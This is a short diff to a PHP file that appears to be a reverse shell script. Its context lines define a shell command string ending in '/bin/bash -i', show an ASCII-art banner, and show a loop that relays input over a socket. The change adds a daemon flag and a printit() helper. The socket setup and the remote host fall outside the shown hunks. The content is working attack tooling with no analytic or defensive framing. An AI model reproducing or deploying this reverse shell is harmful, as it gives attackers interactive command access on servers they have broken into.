@@ -8,6 +8,7 @@ $chunk_size = 1400;
 $shell = 'uname -a; w; id; /bin/bash -i';
 $contador = 0;
 $debug = 0;
+$daemon = 0;
 $welcome_message = "  \033[1;34m_____   _   _   _____   _   _   _  __  _____   
  / ____| | | | | |_   _| | \ | | | |/ / |_   _|  
 | (___   | |_| |   | |   |  \| | | ' /    | |    
@@ -90,6 +91,11 @@ while (1) {
 		fwrite($sock, $input);
 	}
 
-    
 }
-?>
+function printit ($string) {
+	if (!$daemon) {
+		print "$string\n";
+	}
+}
+
+?>  
